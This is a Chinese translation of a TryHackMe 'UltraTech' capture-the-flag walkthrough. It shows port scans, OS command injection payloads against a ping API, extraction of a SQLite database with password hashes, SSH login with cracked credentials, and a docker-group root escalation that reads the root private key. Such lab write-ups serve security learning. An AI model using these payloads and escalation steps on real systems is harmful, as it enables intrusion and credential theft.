# TryHackMe:超科技

> 原文：<https://medium.com/nerd-for-tech/tryhackme-ultratech-ce39a0640b49?source=collection_archive---------4----------------------->

![](img/16e4660abdacfe693b0c7f983c906a79.png)

[UltraTech](https://tryhackme.com/room/ultratech1) 被列为中等房间，但感觉相当容易。该房间侧重于基本枚举、webapp 测试和权限提升。

那么，让我们开始吧！

# 初始计数

启动机器后，我们可以做的第一件事是尝试通过浏览器访问 IP 地址，以检查是否有网站托管在端口 80 或 443 上，但在这种情况下，我们无法通过端口 80/443 连接。这表明 80/443 端口很有可能被关闭。

在初始枚举中，我们可以做的下一件事是对提供的 IP 地址运行基本的`nmap`扫描。考虑到我们想要扫描所有端口，我们可以首先运行一个`TCP SYN`扫描来获得所有开放端口的列表，然后运行一个深度扫描，只关注开放端口。

```
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ sudo nmap -p- -sS 10.10.49.27 | tee open_ports
[sudo] password for kali: 
Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org) ) at 2021-04-23 10:45 EDT
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.51% done; ETC: 10:56 (0:10:17 remaining)
Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.47% done; ETC: 10:59 (0:10:58 remaining)
Nmap scan report for 10.10.49.27
Host is up (0.15s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown
​
Nmap done: 1 IP address (1 host up) scanned in 1078.39 seconds

┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ sudo nmap -sV -sC -A -O -T4 -p21,22,8081,31331 10.10.49.27 | tee service_scan
[sudo] password for kali: 
Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org) ) at 2021-04-23 11:15 EDT
Nmap scan report for 10.10.49.27
Host is up (0.16s latency).
​
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%), Linux 3.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
​
TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   163.70 ms 10.8.0.1
2   164.16 ms 10.10.49.27
​
OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 30.91 seconds
​
```

从这些结果中，我们可以看到 node.js 运行在端口 8081 上，Apache web server 运行在端口 31331 上。我们可以在我们的浏览器上访问和检查它们。

端口 8081 上的页面如下所示:

![](img/7cd4b14b2d201d1e2c852f39daafdd41.png)

在端口 31331 上，我们可以看到一个网页:

![](img/fdd9ecfe502117133e7ab7f677b11243.png)

现在，我们可以继续在这两个端口上执行目录遍历攻击:

```
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ dirb [http://10.10.49.27:8081](http://10.10.49.27:8081)                                                                         
​
-----------------
DIRB v2.22    
By The Dark Raver
-----------------
​
START_TIME: Fri Apr 23 22:26:14 2021
URL_BASE: [http://10.10.49.27:8081/](http://10.10.49.27:8081/)
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
​
-----------------
​
GENERATED WORDS: 4612                                                          
​
---- Scanning URL: [http://10.10.49.27:8081/](http://10.10.49.27:8081/) ----
+ [http://10.10.49.27:8081/auth](http://10.10.49.27:8081/auth) (CODE:200|SIZE:39)                                                                    
+ [http://10.10.49.27:8081/ping](http://10.10.49.27:8081/ping) (CODE:500|SIZE:1094)                                                                  

-----------------
END_TIME: Fri Apr 23 22:40:31 2021
DOWNLOADED: 4612 - FOUND: 2
​
```

从上面的结果可以看出，`dirb`在端口 8081 上检测到了 2 个文件路径。

对于端口 31331，我们得到以下结果:

```
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ ffuf -u [http://10.10.187.174:31337/FUZZ](http://10.10.187.174:31337/FUZZ) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.1/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
​
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
​
       v1.2.1
________________________________________________
​
 :: Method           : GET
 :: URL              : [http://10.10.187.174:31331/FUZZ](http://10.10.187.174:31331/FUZZ)
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________
​
# directory-list-2.3-medium.txt [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
# Copyright 2007 James Fisher [Status: 200, Size: 6092, Words: 393, Lines: 140]
                        [Status: 200, Size: 6092, Words: 393, Lines: 140]
# on atleast 2 different hosts [Status: 200, Size: 6092, Words: 393, Lines: 140]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 6092, Words: 393, Lines: 140]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 6092, Words: 393, Lines: 140]
# license, visit [http://creativecommons.org/licenses/by-sa/3.0/](http://creativecommons.org/licenses/by-sa/3.0/)  [Status: 200, Size: 6092, Words: 393, Lines: 140]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 6092, Words: 393, Lines: 140]
css                     [Status: 301, Size: 321, Words: 20, Lines: 10]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
#                       [Status: 200, Size: 6092, Words: 393, Lines: 140]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10]
# This work is licensed under the Creative Commons  [Status: 200, Size: 6092, Words: 393, Lines: 140]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 328, Words: 20, Lines: 10]
                        [Status: 200, Size: 6092, Words: 393, Lines: 140]
server-status           [Status: 403, Size: 304, Words: 22, Lines: 12]
:: Progress: [220560/220560] :: Job [1/1] :: 236 req/sec :: Duration: [0:22:27] :: Errors: 0 ::
```

我们可以检查每个检测到的路径，发现在`js`目录中有一些有趣的文件。

![](img/12bd14250143c1b50405fa1682119e81.png)

在检查`api.js`档案时，我们可以发现一些真正有趣的信息。

![](img/78a96eae9cfbe18a949134ef1912dfc5.png)

从 JS 文件中，可以推断出请求被发送到:`http://${getAPIURL()}/ping?ip=${window.location.hostname}`，其中函数`${getAPIURL()}`返回`${window.location.hostname}:8081`，它只不过是 web 主机的域名。在我们的例子中，我们可以尝试机器本身的 IP 地址。

![](img/3872cfb5144e029a976904d0cd308045.png)

> *正常输出无法正常显示，因此使用* `*view-source*` *看起来更直观。*

# 最初的立足点

我们可以看到`ping`命令正在后台运行。因此，我们可以尝试在这里执行操作系统命令注入。

```
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93;ls # Does not work
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93|ls # Does not work
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93|`ls` # Works but only one word gets printed in the output
```

从一个单词的输出中，我们可以看到一个`.sqlite`字段的名称被返回。

我们知道命令正在机器上执行，但是我们看不到正确的输出。因此，我们可以通过执行以下步骤来尝试下载`.sqlite`文件以检查其内容:

1.  通过发送命令`which python`代替 URL 中的`ls`，检查`python`是否安装在机器上:

![](img/13d6939f7870d00aefe099733820ee82.png)

在这里，可以看到`/usr/bin/python`出现在机器上。

2.因此，我们可以通过发送命令`python -m SimpleHTTPServer`来启动一个 python 服务器，之后页面会一直加载，表明命令执行成功。

3.现在，我们可以在本地机器上使用`wget`从目标机器下载`.sqlite`文件:

```
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ wget [http://10.10.193.93:8000/utech.db.sqlite](http://10.10.193.93:8000/utech.db.sqlite)
 — 2021–04–23 12:09:45 —  [http://10.10.193.93:8000/utech.db.sqlite](http://10.10.193.93:8000/utech.db.sqlite)
Connecting to 10.10.193.93:8000… connected.
HTTP request sent, awaiting response… 200 OK
Length: 8192 (8.0K) [application/octet-stream]
Saving to: ‘utech.db.sqlite’
​
utech.db.sqlite 0%[ ] 0 — .-KB/s utech.db.sqlite 44%[===================> ] 3.55K 10.4KB/s utech.db.sqlite 100%[==============================================>] 8.00K 12.2KB/s utech.db.sqlite 100%[==============================================>] 8.00K 12.2KB/s in 0.7s 
​
2021–04–23 12:09:46 (12.2 KB/s) — ‘utech.db.sqlite’ saved [8192/8192]
```

> 这里有一些猜测工作。通常 python 服务器在端口 8000 上启动，这就是我使用 8000 的原因，但是如果这个命令没有成功执行，我们可以尝试端口 8080 或者我们可以传递我们自己的特定端口。

因为我们有了`.sqlite`文件，我们可以使用`sqlite3`命令打开它，并检查存储在其中的数据。

```
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$ sqlite3 utech.db.sqlite 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .database
main: /home/kali/Desktop/oscp/ultraTech/utech.db.sqlite r/w
sqlite> .tables
users
sqlite> select * from users
   ...> ;
admin|0d0ea5111e3c1def594c1684e3b9be84|0
r00t|f357a0c52799563c7c7b76c1e7543a32|0
```

从`.sqlite`文件中，我们能够获得两个用户的散列。我们可以尝试在[破解站](https://crackstation.net/)破解它们，并获得两个账户的密码。

现在，我们有了一对用户名和密码，并且知道机器上的端口 22 是打开的。我们可以快速尝试 SSH 进入机器:

```
┌──(kali㉿kali)-[~/Desktop/oscp/ultraTech]
└─$                                                                                                     ssh r00t@10.10.187.174 
The authenticity of host '10.10.187.174 (10.10.187.174)' can't be established.
ECDSA key fingerprint is SHA256:RWpgXxl3MyUqAN4AHrH/ntrheh2UzgJMoGAPI+qmGEU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.187.174' (ECDSA) to the list of known hosts.
r00t@10.10.187.174's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)
​
 * Documentation:  [https://help.ubuntu.com](https://help.ubuntu.com)
 * Management:     [https://landscape.canonical.com](https://landscape.canonical.com)
 * Support:        [https://ubuntu.com/advantage](https://ubuntu.com/advantage)
​
  System information as of Fri Apr 23 16:15:12 UTC 2021
​
  System load:  0.16               Processes:           105
  Usage of /:   24.4% of 19.56GB   Users logged in:     0
  Memory usage: 72%                IP address for eth0: 10.10.187.174
  Swap usage:   0%
​
​
1 package can be updated.
0 updates are security updates.
​
​
​
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
​
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
​
r00t@ultratech-prod:~$ sudo -l
[sudo] password for r00t: 
Sorry, user r00t may not run sudo on ultratech-prod.
```

可以看到，使用用户“r00t”的凭据，我们可以访问该机器。此外，从`sudo -l`的输出可以清楚地看出，我们不能使用`sudo`特权运行任何命令。因此，我们可以做的下一件事是执行进一步的枚举，以找到任何可能的向量，通过它我们可以将我们的特权提升到`root`。

# 权限提升

我们可以运行一些基本命令来获取关于系统和当前用户的信息:

```
r00t@ultratech-prod:~$ whoami
r00t
r00t@ultratech-prod:~$ uname -a
Linux ultratech-prod 4.15.0-46-generic #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
r00t@ultratech-prod:~$ cat /proc/version
Linux version 4.15.0-46-generic (buildd@lgw01-amd64-038) (gcc version 7.3.0 (Ubuntu 7.3.0-16ubuntu3)) #49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

这里我们得到了执行权限提升的潜在向量，即用户在“docker”组中的存在。我们可以利用这一点将我们的权限提升到`root`，这只是一个简单的命令:

```
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
# cd root
# cd .ssh
# ls -la
total 16
drwx------ 2 root root 4096 Mar 22  2019 .
drwx------ 6 root root 4096 Mar 22  2019 ..
-rw------- 1 root root    0 Mar 19  2019 authorized_keys
-rw------- 1 root root 1675 Mar 22  2019 id_rsa
-rw-r--r-- 1 root root  401 Mar 22  2019 id_rsa.pub
# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
```

因此，基本上`docker`命令可以分解为:

![](img/1ab0f2ee5c2b6d27db530d61e267e059.png)

有了这个，我们就有了超级科技机器！

# 替代方法

执行操作系统命令注入的更好方法是使用关键字`%0a` (换行符):

```
view-source:http://10.10.193.93:8081/ping?ip=10.10.193.93 %0a ls -la
```

这将产生如下输出:

![](img/1e56cf3a2d6daf3d93a758c9871c6961.png)

# 资源

1.  TryHackMe—UltraTech:[https://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)
2.  巴斯拉·德米尔编写的 Pentester 命令注入指南:[https://blog . cobalt . io/a-pentesters-Guide-to-Command-Injection-df 2657 c 8 C1 ad](https://blog.cobalt.io/a-pentesters-guide-to-command-injection-df2657c8c1ad)
3.  Docker 权限提升:[https://keiran . scot/Privilege-Escalation-with-docker-56dc 682 a6 e 17](https://keiran.scot/privilege-escallation-with-docker-56dc682a6e17)

一定要看看我在 https://github.com/0xNirvana[的其他作品和评论](https://github.com/0xNirvana)